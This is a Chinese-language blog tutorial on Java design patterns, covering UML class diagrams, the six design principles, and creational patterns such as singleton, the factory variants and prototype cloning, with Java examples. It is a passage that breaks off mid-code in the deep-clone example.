[{"title":"Java-设计模式","url":"/posts/50902.html","content":"\n# ⓪设计模式基础\n\n## ❶设计模式分类\n\n* **创建型模式**\n\n用于描述**对象实例化（创建对象）的模式，即用于解耦对象的实例化过程**\n\nGoF（四人组）书中提供了单例、原型、工厂方法、抽象工厂、建造者等 **5 种创建型模式**。\n\n* **结构型模式**\n\n用于描述如何**把类或对象结合在一起形成一个更大的结构**，\n\nGoF（四人组）书中提供了代理、适配器、桥接、装饰、外观、享元、组合等 **7 种结构型模式**。\n\n* **行为型模式**\n\n用于描述**类和对象如何交互，及划分责任和算法**。\n\nGoF（四人组）书中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等 **11 种行为型模式**。\n\n## ❷UML-类图\n\n> 统一建模语言（Unified Modeling Language，UML）是用来设计软件的可视化建模语言。它的特点是简单、统一、图形化、能表达软件设计中的动态与静态信息。UML 从目标系统的不同角度出发，定义了用例图、类图、对象图、状态图、活动图、时序图、协作图、构件图、部署图等 9 种图。\n\n类图(Class diagram)是显示了模型的静态结构，特别是模型中存在的类、类的内部结构以及它们与其他类的关系等。类图不显示暂时性的信息。类图是面向对象建模的主要组成部分。\n\n### 0.类图表示法\n\n在UML类图中，类使用包含类名、属性(field) 和方法(method) 且带有分割线的矩形来表示，比如下图表示一个Employee类，它包含name,age和address这3个属性，以及work()方法。 \n\n![](https://img.jwt1399.top/img/202211082308467.png)\n\n属性/方法名称前加的加号和减号表示了这个属性/方法的可见性，UML类图中表示可见性的符号有三种：\n\n* +：表示public\n\n* -：表示private\n\n* #：表示protected\n\n* 什么都不加表示default\n\n属性的完整表示方式是： **可见性  名称 ：类型 [ = 缺省值]**  \n\n方法的完整表示方式是： **可见性  名称(参数列表) [ ： 返回类型]**\n\n> 注意：\n>\n> ​\t1，中括号中的内容表示是可选的\n>\n> ​\t2，也有将类型放在变量名前面，返回值类型放在方法名前面\n\n![类的关系](https://img.jwt1399.top/img/202211082325582.png)\n\n### 1.关联关系\n\n> 通常关联关系用来实现连接有关联的对象所对应的类，即将一个类的对象作为另一个类的属性。关联又可以分为单向关联，双向关联，自关联。\n\n#### **a.单向关联**\n\n单向关联用一个带箭头的实线表示。下图表示每个顾客都有一个地址，这通过让Customer类持有一个类型为Address的成员变量类实现。\n\n![](https://img.jwt1399.top/img/202211082320339.png)\n\n#### **b.双向关联**\n\n双向关联就是双方各自持有对方类型的成员变量。双向关联用一个不带箭头的直线表示。下图中在Customer类中维护一个List\\<Product>，表示一个顾客可以购买多个商品；在Product类中维护一个Customer类型的成员变量表示这个产品被哪个顾客所购买。\n\n![](https://img.jwt1399.top/img/202211082320373.png)\n\n#### **c.自关联**\n\n自关联用一个带有箭头且指向自身的线表示。下图的意思就是Node类包含类型为Node的成员变量，也就是“自己包含自己”。\n\n![](https://img.jwt1399.top/img/202211082320886.png)\n\n### 2.聚合关系\n\n> 聚合关系表示整体与部分的关系，成员对象是整体对象的一部分，但是成员对象可以脱离整体对象而独立存在。例如，学校与老师的关系，学校包含老师，但如果学校停办了，老师依然存在。\n\n聚合关系可以用带空心菱形的实线来表示，菱形指向整体。下图所示是大学和教师的关系图：\n\n![](https://img.jwt1399.top/img/202211082328836.png)\n\n### 3.组合关系\n\n> 组合表示类之间的整体与部分的关系，但它是一种更强烈的聚合关系。在组合关系中，整体对象可以控制部分对象的生命周期，一旦整体对象不存在，部分对象也将不存在，部分对象不能脱离整体对象而存在。例如，头和嘴的关系，没有了头，嘴也就不存在了。\n\n组合关系用带实心菱形的实线来表示，菱形指向整体。下图所示是头和嘴的关系图：\n\n![](https://img.jwt1399.top/img/202211082330291.png)\n\n### 4.依赖关系\n\n> 依赖关系是一种使用关系，它是对象之间耦合度最弱的一种关联方式，是临时性的关联。在代码中，某个类的方法通过局部变量、方法的参数或者对静态方法的调用来访问另一个类（被依赖类）中的某些方法来完成一些职责。\n\n依赖关系使用带箭头的虚线来表示，箭头从使用类指向被依赖的类。下图所示是司机和汽车的关系图，司机驾驶汽车：\n\n![](https://img.jwt1399.top/img/202211082332399.png)\n\n从图中可以看出Driver中使用了Car的move方法。那么就说明Driver是依赖于Car才能做Driver的职责。那么又有人会问聚合与依赖有区别吗，当然很明显Driver是一个整体，Car也是整体。不是整体与部分关系。\n\n### 5.继承关系\n\n> 继承关系是对象之间耦合度最大的一种关系，表示一般与特殊的关系，是父类与子类之间的关系，是一种继承关系。\n\n泛化(继承)关系用带空心三角箭头的实线来表示，箭头从子类指向父类。例如，Student 类和 Teacher 类都是 Person 类的子类，其类图如下图所示：\n\n![](https://img.jwt1399.top/img/202211082333096.png)\n\n\n\n### 6.实现关系\n\n> 实现关系是接口与实现类之间的关系。在这种关系中，类实现了接口，类中的操作实现了接口中所声明的所有的抽象操作。\n\n实现关系使用带空心三角箭头的虚线来表示，箭头从实现类指向接口。例如，汽车和船实现了交通工具，其类图如图所示。\n\n![](https://img.jwt1399.top/img/202211082334819.png)\n\n## ❸软件设计原则\n\n> 在软件开发中，为了提高软件系统的可维护性和可复用性，增加软件的可扩展性和灵活性，程序员要尽量根据6条原则来开发程序，从而提高软件开发效率、节约软件开发成本和维护成本。\n\n### 1.开闭原则（OCP）\n\n**对扩展开放，对修改关闭**。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类。\n\n因为抽象灵活性好，适应性广，只要抽象的合理，可以基本保持软件架构的稳定。而软件中易变的细节可以从抽象派生来的实现类来进行扩展，当软件需要发生变化时，只需要根据需求重新派生一个实现类来扩展就可以了。\n\n【例】以 `搜狗输入法` 的皮肤为例介绍开闭原则的应用。\n\n分析：`搜狗输入法` 的皮肤是输入法背景图片、窗口颜色和声音等元素的组合。用户可以根据自己的喜爱更换自己的输入法的皮肤，也可以从网上下载新的皮肤。这些皮肤有共同的特点，可以为其定义一个抽象类（AbstractSkin），而每个具体的皮肤（DefaultSpecificSkin和HeimaSpecificSkin）是其子类。用户窗体可以根据需要选择或者增加新的主题，而不需要修改原代码，所以它是满足开闭原则的。![](https://img.jwt1399.top/img/202211082338060.png)\n\n### 2.里氏代换原则（LSP）\n\n子类可以扩展父类的功能，但不能改变父类原有的功能。换句话说，子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。如果通过重写父类的方法来完成新的功能，这样写起来虽然简单，但是整个继承体系的可复用性会比较差，特别是运用多态比较频繁时，程序运行出错的概率会非常大。\n\n【例】正方形不是长方形。\n\n在数学领域里，正方形毫无疑问是长方形，它是一个长宽相等的长方形。所以，我们开发的一个与几何图形相关的软件系统，就可以顺理成章的让正方形继承自长方形。\n\n![](https://img.jwt1399.top/img/202211082347129.png)\n\n长方形类 Rectangle，正方形类 Square，resize方法是RectandleDemo类中的方法，用来实现宽度逐渐增长的效果。\n\n- 假如我们把一个普通长方形作为参数传入resize方法，就会看到长方形宽度逐渐增长的效果，当宽度大于长度，代码就会停止，这种行为的结果符合我们的预期；\n\n- 假如我们再把一个正方形作为参数传入resize方法后，就会看到正方形的宽度和长度都在不断增长，代码会一直运行下去，直至系统产生溢出错误。\n- 所以，普通的长方形是适合的，正方形不适合。我们得出结论：在resize方法中，Rectangle类型的参数是不能被Square类型的参数所代替，如果进行了替换就得不到预期结果。因此，Square类和Rectangle类之间的继承关系违反了里氏代换原则，它们之间的继承关系不成立，正方形不是长方形。\n\n如何改进呢？此时我们需要重新设计他们之间的关系。抽象出来一个四边形接口(Quadrilateral)，让Rectangle类和Square类实现Quadrilateral接口\n\n![](https://img.jwt1399.top/img/202211091603915.png)\n\n### 3.依赖倒转原则（DIP）\n\n高层模块不应该依赖低层模块，两者都应该依赖其抽象；抽象不应该依赖细节，细节应该依赖抽象。简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。\n\n【例】组装电脑\n\n现要组装一台电脑，需要配件cpu，硬盘，内存条。只有这些配置都有了，计算机才能正常的运行。选择cpu有很多选择，如Intel，AMD等，硬盘可以选择希捷，西数等，内存条可以选择金士顿，海盗船等。\n\n<img src=\"https://img.jwt1399.top/img/202211092111320.png\" style=\"zoom:67%;\" />\n\n可以看到已经组装了一台电脑，但是似乎组装的电脑的cpu只能是Intel的，内存条只能是金士顿的，硬盘只能是希捷的，这对用户肯定是不友好的，用户有了机箱肯定是想按照自己的喜好，选择自己喜欢的配件。\n\n根据依赖倒转原则进行改进：我们只需要修改Computer类，让Computer类依赖抽象（各个配件的接口），而不是依赖于各个组件具体的实现类。\n\n<img src=\"https://img.jwt1399.top/img/202211092111536.png\" style=\"zoom:67%;\" />\n\n### 4.接口隔离原则（ISP）\n\n客户端不应该被迫依赖于它不使用的方法；一个类对另一个类的依赖应该建立在最小的接口上。\n\n【例】安全门案例\n\n我们需要创建一个黑马品牌的安全门，该安全门具有防火、防水、防盗的功能。可以将防火，防水，防盗功能提取成一个接口，形成一套规范。类图如下：\n\n![](https://img.jwt1399.top/img/202211092115850.png)\n\n上面的设计我们发现了它存在的问题，黑马品牌的安全门具有防盗，防水，防火的功能。现在如果我们还需要再创建一个传智品牌的安全门，而该安全门只具有防盗、防水功能呢？很显然如果实现SafetyDoor接口就违背了接口隔离原则，那么我们如何进行修改呢？\n\n![](https://img.jwt1399.top/img/202211092115885.png)\n\n### 5.迪米特法则（LOD）\n\n迪米特法则又叫最少知识原则。只和你的直接朋友交谈，不跟“陌生人”说话。\n\n如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。\n\n【例】明星与经纪人的关系实例\n\n明星由于全身心投入艺术，所以许多日常事务由经纪人负责处理，如和粉丝的见面会，和媒体公司的业务洽淡等。这里的经纪人是明星的朋友，而粉丝和媒体公司是陌生人，所以适合使用迪米特法则。\n\n<img src=\"https://img.jwt1399.top/img/202211092126268.png\" style=\"zoom:67%;\" />\n\n### 6.合成复用原则（CARP）\n\n合成复用原则是指：尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。\n\n【例】汽车分类管理程序\n\n汽车按“动力源”划分可分为汽油汽车、电动汽车等；按“颜色”划分可分为白色汽车、黑色汽车和红色汽车等。如果同时考虑这两种分类，其组合就很多。\n\n<img src=\"https://img.jwt1399.top/img/202211092125045.png\" style=\"zoom:67%;\" />\n\n从上面类图我们可以看到使用继承复用产生了很多子类，如果现在又有新的动力源或者新的颜色的话，就需要再定义新的类。我们试着将继承复用改为聚合复用看一下。\n\n![](https://img.jwt1399.top/img/202211092125707.png)\n\n\n\n# ①创建型模式-5种\n\n> 创建型模式的主要关注点是“怎样创建对象？”，它的主要特点是“将对象的创建与使用分离”。\n>\n> 这样可以降低系统的耦合度，使用者不需要关注对象的创建细节。\n\n## ❶单例模式\n\n单例模式（Singleton Pattern）提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责**创建自己的对象**，同时确保只有**单个对象被创建**。这个类**提供了一种访问其唯一的对象的方式**，可以直接访问，不需要实例化该类的对象。\n\n单例设计模式分为两种：\n\n- 饿汉式：类加载就会导致该单实例对象被创建\t\n\n- 懒汉式：类加载不会导致该单实例对象被创建，而是首次使用该对象时才会创建\n\n### 1.饿汉式\n\n#### **方式1（静态变量方式）**\n\n```java\npublic class Singleton {\n    //私有构造方法\n    private Singleton() {}\n\n    //在成员位置创建该类的对象\n    private static Singleton instance = new Singleton();\n\n    //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n        return instance;\n    }\n}\n```\n\n该方式在成员位置声明Singleton类型的静态变量，并创建Singleton类的对象instance。instance对象是随着类的加载而创建的。如果该对象足够大的话，而一直没有使用就会造成内存的浪费。\n\n#### **方式2（静态代码块方式）**\n\n```java\npublic class Singleton {\n    //私有构造方法\n    private Singleton() {}\n\n    //在成员位置创建该类的对象\n    private static Singleton instance;\n    static {\n        instance = new Singleton();\n    }\n\n    //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n        return instance;\n    }\n}\n```\n\n该方式在成员位置声明Singleton类型的静态变量，而对象的创建是在静态代码块中，也是对着类的加载而创建。所以和饿汉式的方式1基本上一样，当然该方式也存在内存浪费问题。\n\n#### 方式3（枚举方式）-推荐\n\n```java\npublic enum Singleton {\n    INSTANCE;\n}\n```\n\n枚举类实现单例模式是极力推荐的单例实现模式，因为枚举类型是线程安全的，并且只会装载一次，设计者充分的利用了枚举的这个特性来实现单例模式，枚举的写法非常简单，而且枚举类型是所用单例实现中唯一一种不会被破坏的单例实现模式。\n\n### 2.懒汉式\n\n#### **方式1（线程不安全）**\n\n```java\npublic class Singleton {\n    //私有构造方法\n    private Singleton() {}\n\n    //在成员位置创建该类的对象\n    private static Singleton instance;\n\n    //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n        // 保证始终只创建一个对象\n        if(instance == null) { //这里会出现线程安全问题\n            instance = new Singleton();\n        }\n        return instance;\n    }\n}\n```\n\n该方式在成员位置声明Singleton类型的静态变量，当调用getInstance()方法获取Singleton类的对象的时候才创建Singleton类的对象，这样就实现了懒加载的效果。但是，如果是多线程环境，会出现线程安全问题。\n\n#### **方式2（线程安全）**\n\n```java\npublic class Singleton {\n    //私有构造方法\n    private Singleton() {}\n\n    //在成员位置创建该类的对象\n    private static Singleton instance;\n\n    //对外提供静态方法获取该对象\n    public static synchronized Singleton getInstance() {\n\n        if(instance == null) {\n            instance = new Singleton();\n        }\n        return instance;\n    }\n}\n```\n\n该方式也实现了懒加载效果，同时又解决了线程安全问题。但是在getInstance()方法上添加了synchronized关键字，导致该方法的执行效果特别低。从上面代码我们可以看出，其实就是在初始化instance的时候才会出现线程安全问题，一旦初始化完成就不存在了。\n\n#### 方式3（双重检查锁）-推荐\n\n对于 `getInstance()` 方法来说，绝大部分的操作都是读操作，读操作是线程安全的，所以我们没必让每个线程必须持有锁才能调用该方法，我们需要调整加锁的时机。由此也产生了一种新的实现模式：双重检查锁模式\n\n```java\npublic class Singleton { \n\n    //私有构造方法\n    private Singleton() {}\n\n    private static Singleton instance;\n\n   //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n\t\t//第一次判断，如果instance不为null，不进入抢锁阶段，直接返回实例\n        if(instance == null) {\n            synchronized (Singleton.class) {\n                //抢到锁之后再次判断是否为null\n                if(instance == null) {\n                    instance = new Singleton();\n                }\n            }\n        }\n        return instance;\n    }\n}\n```\n\n双重检查锁模式是一种非常好的单例实现模式，解决了单例、性能、线程安全问题，上面的双重检测锁模式看上去完美无缺，其实是存在问题，在多线程的情况下，可能会出现空指针问题，出现问题的原因是JVM在实例化对象的时候会进行优化和指令重排序操作。\n\n要解决双重检查锁模式带来空指针异常的问题，只需要使用 `volatile` 关键字, `volatile` 关键字可以保证可见性和有序性。\n\n```java\npublic class Singleton {\n\n    //私有构造方法\n    private Singleton() {}\n\n    private static volatile Singleton instance;\n\n   //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n\t\t//第一次判断，如果instance不为null，不进入抢锁阶段，直接返回实际\n        if(instance == null) {\n            synchronized (Singleton.class) {\n                //抢到锁之后再次判断是否为空\n                if(instance == null) {\n                    instance = new Singleton();\n                }\n            }\n        }\n        return instance;\n    }\n}\n```\n\n添加 `volatile` 关键字之后的双重检查锁模式是一种比较好的单例实现模式，能够保证在多线程的情况下线程安全也不会有性能问题。\n\n#### 方式4（静态内部类）-推荐\n\n静态内部类单例模式中实例由内部类创建，由于 JVM 在加载外部类的过程中，是不会加载静态内部类的， 只有内部类的属性/方法被调用时才会被加载, 并初始化其静态属性。静态属性由于被 `static` 修饰，保证只被实例化一次，并且严格保证实例化顺序。\n\n```java\npublic class Singleton {\n\n    //私有构造方法\n    private Singleton() {}\n\n    private static class SingletonHolder {\n        private static final Singleton INSTANCE = new Singleton();\n    }\n\n    //对外提供静态方法获取该对象\n    public static Singleton getInstance() {\n        return SingletonHolder.INSTANCE;\n    }\n}\n```\n\n第一次加载Singleton类时不会去初始化INSTANCE，只有第一次调用getInstance，虚拟机加载SingletonHolder，并初始化INSTANCE，这样不仅能确保线程安全，也能保证 Singleton 类的唯一性。\n\n静态内部类单例模式是一种优秀的单例模式，是开源项目中比较常用的一种单例模式。在没有加任何锁的情况下，保证了多线程下的安全，并且没有任何性能影响和空间的浪费。\n\n## ❷工厂模式\n\n> 需求：设计一个咖啡店点餐系统。  设计一个咖啡类（Coffee），并定义其两个子类（美式咖啡【AmericanCoffee】和拿铁咖啡【LatteCoffee】）；再设计一个咖啡店类（CoffeeStore），咖啡店具有点咖啡的功能。\n\n![](https://img.jwt1399.top/img/202211101706221.png)\n\n```java\npublic class Client {\n    public static void main(String[] args) {\n        //1,创建咖啡店类\n        CoffeeStore store = new CoffeeStore();\n        //2,点咖啡\n        Coffee coffee = store.orderCoffee(\"american\");\n\n        System.out.println(coffee.getName());\n    }\n}\n```\n\n### 1.简单工厂模式\n\n简单工厂包含如下角色：\n\n* 抽象产品 ：定义了产品的规范，描述了产品的主要特性和功能。\n* 具体产品 ：实现或者继承抽象产品的子类\n* 具体工厂 ：提供了创建产品的方法，调用者通过该方法来获取产品。\n\n现在使用简单工厂对上面案例进行改进，类图如下：\n\n![](https://img.jwt1399.top/img/202211101706850.png)\n\n```java\npublic class SimpleCoffeeFactory {\n  \n    public Coffee createCoffee(String type) {\n        Coffee coffee = null;\n        if(\"americano\".equals(type)) {\n            coffee = new AmericanoCoffee();\n        } else if(\"latte\".equals(type)) {\n            coffee = new LatteCoffee();\n        }\n        return coffee;\n    }\n}\n```\n\n如果要添加新产品直接修改工厂类，而不需要在原代码中修改，这就降低了客户代码修改的可能性，更易扩展。\n\n封装了创建对象的过程，可以通过参数直接获取对象。把对象的创建和业务逻辑层分开，这样以后就避免了修改客户代码。\n\n工厂处理创建对象的细节：\n\n一旦有了SimpleCoffeeFactory，CoffeeStore类中的orderCoffee()就变成此对象的客户，后期如果需要Coffee对象直接从工厂中获取即可。这样也就解除了CoffeeStore和Coffee实现类的耦合，但同时又产生了新的耦合，CoffeeStore对象和SimpleCoffeeFactory工厂对象的耦合，工厂对象和商品对象的耦合。后期如果再加新品种的咖啡，我们势必要需求修改SimpleCoffeeFactory的代码，违反了开闭原则。\n\n**静态工厂**\n\n在开发中也有一部分人将工厂类中的创建对象的功能定义为静态的，这个就是静态工厂模式。\n\n```java\npublic class SimpleCoffeeFactory {\n\n    public static Coffee createCoffee(String type) {\n        Coffee coffee = null;\n        if(\"americano\".equals(type)) {\n            coffee = new AmericanoCoffee();\n        } else if(\"latte\".equals(type)) {\n            coffee = new LatteCoffee();\n        }\n        return coffe;\n    }\n}\n```\n\n### 2.工厂方法模式\n\n针对上例中的缺点，使用工厂方法模式就可以完美的解决，完全遵循开闭原则。定义一个用于创建对象的接口，让子类决定实例化哪个产品类对象。工厂方法使一个产品类的实例化延迟到其工厂的子类。\n\n工厂方法模式的主要角色：\n\n* 抽象工厂：提供了创建产品的接口，调用者通过它访问具体工厂的工厂方法来创建产品。\n* 具体工厂：主要是实现抽象工厂中的抽象方法，完成具体产品的创建。\n* 抽象产品：定义了产品的规范，描述了产品的主要特性和功能。\n* 具体产品：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应。\n\n![](https://img.jwt1399.top/img/202211102132846.png)\n\n抽象工厂：\n\n```java\npublic interface CoffeeFactory {\n    Coffee createCoffee();\n}\n```\n\n具体工厂：\n\n```java\npublic class LatteCoffeeFactory implements CoffeeFactory {\n    public Coffee createCoffee() {\n        return new LatteCoffee();\n    }\n}\n\n\npublic class AmericanCoffeeFactory implements CoffeeFactory {\n    public Coffee createCoffee() {\n        return new AmericanCoffee();\n    }\n}\n```\n\n咖啡店类：\n\n```java\npublic class CoffeeStore {\n\n    private CoffeeFactory factory;\n\n    public CoffeeStore(CoffeeFactory factory) {\n        this.factory = factory;\n    }\n\n    public Coffee orderCoffee(String type) {\n        Coffee coffee = factory.createCoffee();\n        coffee.addMilk();\n        coffee.addsugar();\n        return coffee;\n    }\n}\n```\n\n**优点：**\n\n- 用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程；\n- 在系统增加新产品时只需要添加具体产品类和对应的具体工厂类，无须对原工厂进行修改，满足开闭原则；\n\n**缺点：**\n\n* 每增加一个产品就要增加一个具体产品类和一个对应的具体工厂类，这增加了系统的复杂度。\n\n### 3.模式扩展\n\n可以通过**工厂模式+配置文件**的方式解除工厂对象和产品对象的耦合。在工厂类中加载配置文件中的全类名，并创建对象进行存储，客户端如果需要对象，直接进行获取即可。\n\n第一步：定义配置文件\n\n为了演示方便，我们使用properties文件作为配置文件，名称为bean.properties\n\n```properties\namerican=com.itheima.pattern.factory.config_factory.AmericanCoffee\nlatte=com.itheima.pattern.factory.config_factory.LatteCoffee\n```\n\n第二步：改进工厂类\n\n```java\npublic class CoffeeFactory {\n\n    private static Map<String,Coffee> map = new HashMap<>();\n\n    static {\n        Properties p = new Properties();\n        InputStream is = CoffeeFactory.class.getClassLoader().getResourceAsStream(\"bean.properties\");\n        try {\n            p.load(is);\n            //遍历Properties集合对象\n            Set<Object> keys = p.keySet();\n            for (Object key : keys) {\n                //根据键获取值（全类名）\n                String className = p.getProperty((String) key);\n                //获取字节码对象\n                Class clazz = Class.forName(className);\n                Coffee obj = (Coffee) clazz.newInstance();\n                map.put((String)key,obj);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static Coffee createCoffee(String name) {\n\n        return map.get(name);\n    }\n}\n```\n\n静态成员变量用来存储创建的对象（键存储的是名称，值存储的是对应的对象），而读取配置文件以及创建对象写在静态代码块中，目的就是只需要执行一次。\n\n> 1,DateForamt类中的getInstance()方法使用的是工厂模式；\n>\n> 2,Calendar类中的getInstance()方法使用的是工厂模式；\n>\n> 3,Collection.iterator方法使用的是工厂模式；\n\n## ❸抽象工厂模式\n\n抽象工厂模式是工厂方法模式的升级版本，工厂方法模式只生产一个种类的产品，而抽象工厂模式可生产多个种类的产品。\n\n抽象工厂模式是一种为访问类提供一个创建一组相关或相互依赖对象的接口，且访问类无须指定所要产品的具体类就能得到同族的不同等级的产品的模式结构。\n\n本节要介绍的抽象工厂模式将考虑多等级产品的生产，将同一个具体工厂所生产的位于不同等级的一组产品称为一个产品族，下图所示横轴是产品等级，也就是同一类产品；纵轴是产品族，也就是同一品牌的产品，同一品牌的产品产自同一个工厂。\n\n<img src=\"https://img.jwt1399.top/img/202211102132748.png\" style=\"zoom:67%;\" />\n\n抽象工厂模式的主要角色如下：\n\n* 抽象工厂：提供了创建产品的接口，它包含多个创建产品的方法，可以创建多个不同等级的产品。\n* 具体工厂：主要是实现抽象工厂中的多个抽象方法，完成具体产品的创建。\n* 抽象产品：定义了产品的规范，描述了产品的主要特性和功能，抽象工厂模式有多个抽象产品。\n* 具体产品：实现了抽象产品角色所定义的接口，由具体工厂来创建，它 同具体工厂之间是多对一的关系。\n\n现咖啡店业务发生改变，不仅要生产咖啡还要生产甜点，如提拉米苏、抹茶慕斯等，要是按照工厂方法模式，需要定义提拉米苏类、抹茶慕斯类、提拉米苏工厂、抹茶慕斯工厂、甜点工厂类，很容易发生类爆炸情况。\n\n其中拿铁咖啡、美式咖啡是一个产品等级，都是咖啡；提拉米苏、抹茶慕斯也是一个产品等级；\n\n拿铁和提拉米苏是同一产品族（都属于意大利风味），美式和抹茶慕斯是同一产品族（都属于美式风味）。\n\n所以这个案例可以使用抽象工厂模式实现。\n\n![](https://img.jwt1399.top/img/202211102132449.png)\n\n抽象工厂：\n\n```java\npublic interface DessertFactory {\n\n    Coffee createCoffee();\n\n    Dessert createDessert();\n}\n```\n\n具体工厂：\n\n```java\n//美式甜点工厂\npublic class AmericanDessertFactory implements DessertFactory {\n\n    public Coffee createCoffee() {\n        return new AmericanCoffee();\n    }\n\n    public Dessert createDessert() {\n        return new MatchaMousse();\n    }\n}\n//意大利风味甜点工厂\npublic class ItalyDessertFactory implements DessertFactory {\n\n    public Coffee createCoffee() {\n        return new LatteCoffee();\n    }\n\n    public Dessert createDessert() {\n        return new Tiramisu();\n    }\n}\n```\n\n如果要加同一个产品族的话，只需要再加一个对应的工厂类即可，不需要修改其他的类。\n\n**优点：**\n\n当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。\n\n**缺点：**\n\n当产品族中需要增加一个新的产品时，所有的工厂类都需要进行修改。\n\n**使用场景：**\n\n* 当需要创建的对象是一系列相互关联或相互依赖的产品族时，如电器工厂中的电视机、洗衣机、空调等。\n\n* 系统中有多个产品族，但每次只使用其中的某一族产品。如有人只喜欢穿某一个品牌的衣服和鞋。\n\n* 系统中提供了产品的类库，且所有产品的接口相同，客户端不依赖产品实例的创建细节和内部结构。\n\n## ❹原型模式\n\n用一个已经创建的实例作为原型，通过复制该原型对象来创建一个和原型对象相同的新对象。\n\n原型模式包含如下角色：\n\n* 抽象原型类：规定了具体原型对象必须实现的的 clone() 方法。\n* 具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象。\n* 访问类：使用具体原型类中的 clone() 方法来复制新的对象。\n\n![](https://img.jwt1399.top/img/202211102133633.png)\n\n原型模式的克隆分为浅克隆和深克隆。\n\n- 浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。\n\n- 深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。\n\n### 1.浅克隆\n\nJava中的Object类中提供了 `clone()` 方法来实现浅克隆。 Cloneable 接口是上面的类图中的抽象原型类，而实现了Cloneable接口的实现类就是具体的原型类。代码如下：\n\n**Realizetype（具体原型类）：**\n\n```java\npublic class Realizetype implements Cloneable {\n\n    public Realizetype() {\n        System.out.println(\"具体的原型对象创建完成！\");\n    }\n\n    @Override\n    protected Realizetype clone() throws CloneNotSupportedException {\n        System.out.println(\"具体原型复制成功！\");\n        return (Realizetype) super.clone();\n    }\n}\n```\n\n**PrototypeTest（测试访问类）：**\n\n```java\npublic class PrototypeTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n        Realizetype r1 = new Realizetype();\n        Realizetype r2 = r1.clone();\n\n        System.out.println(\"对象r1和r2是同一个对象？\" + (r1 == r2));\n    }\n}\n/**\n*具体的原型对象创建完成！\n*具体原型复制成功！\n*对象r1和r2是同一个对象？false\n*/\n```\n\n**使用场景**\n\n* 对象的创建非常复杂，可以使用原型模式快捷的创建对象。\n* 性能和安全要求比较高。\n\n**案例：用原型模式生成“三好学生”奖状**\n\n同一学校的“三好学生”奖状除了获奖人姓名不同，其他都相同，可以使用原型模式复制多个“三好学生”奖状出来，然后在修改奖状上的名字即可。\n\n![](https://img.jwt1399.top/img/202211102139269.png)\n\n代码如下：\n\n```java\n//奖状类\npublic class Citation implements Cloneable {\n    private String name;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return (this.name);\n    }\n\n    public void show() {\n        System.out.println(name + \"同学：在2022学年第一学期中表现优秀，被评为三好学生。特发此状！\");\n    }\n\n    @Override\n    public Citation clone() throws CloneNotSupportedException {\n        return (Citation) super.clone();\n    }\n}\n\n//测试访问类\npublic class CitationTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n        Citation c1 = new Citation();\n        c1.setName(\"张三\");\n\n        //复制奖状\n        Citation c2 = c1.clone();\n        //将奖状的名字修改李四\n        c2.setName(\"李四\");\n\n        c1.show();\n        c2.show();\n    }\n}\n/**\n*张三同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*李四同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*/\n```\n\n### 2.深克隆\n\n将上面的“三好学生”奖状的案例中Citation类的name属性修改为Student类型的属性。代码如下：\n\n```java\n//奖状类\npublic class Citation implements Cloneable {\n    private Student stu;\n\n    public Student getStu() {\n        return stu;\n    }\n\n    public void setStu(Student stu) {\n        this.stu = stu;\n    }\n\n    void show() {\n        System.out.println(stu.getName() + \"同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\");\n    }\n\n    @Override\n    public Citation clone() throws CloneNotSupportedException {\n        return (Citation) super.clone();\n    }\n}\n\n//学生类\npublic class Student {\n    private String name;\n    private String address;\n\n    public Student(String name, String address) {\n        this.name = name;\n        this.address = address;\n    }\n\n    public Student() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}\n\n//测试类\npublic class CitationTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n\n        Citation c1 = new Citation();\n        Student stu = new Student(\"张三\", \"西安\");\n        c1.setStu(stu);\n\n        //复制奖状\n        Citation c2 = c1.clone();\n        //获取c2奖状所属学生对象\n        Student stu1 = c2.getStu();\n        stu1.setName(\"李四\");\n\n        //判断stu对象和stu1对象是否是同一个对象\n        System.out.println(\"stu和stu1是同一个对象？\" + (stu == stu1));\n\n        c1.show();\n        c2.show();\n    }\n}\n\n/**\n*stu和stu1是同一个对象？true\n*李四同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*李四同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！\n*/\n```\n\nstu对象和stu1对象是同一个对象，就会产生将stu1对象中name属性值改为“李四”，两个Citation（奖状）对象中显示的都是李四。这就是浅克隆的效果，对具体原型类（Citation）中的引用类型的属性进行引用的复制。这种情况需要使用深克隆，而进行深克隆需要使用对象流。代码如下：\n\n```java\npublic class CitationTest1 {\n    public static void main(String[] args) throws Exception {\n        Citation c1 = new Citation();\n        Student stu = new Student(\"张三\", \"西安\");\n        c1.setStu(stu);\n\n        //创建对象输出流对象\n        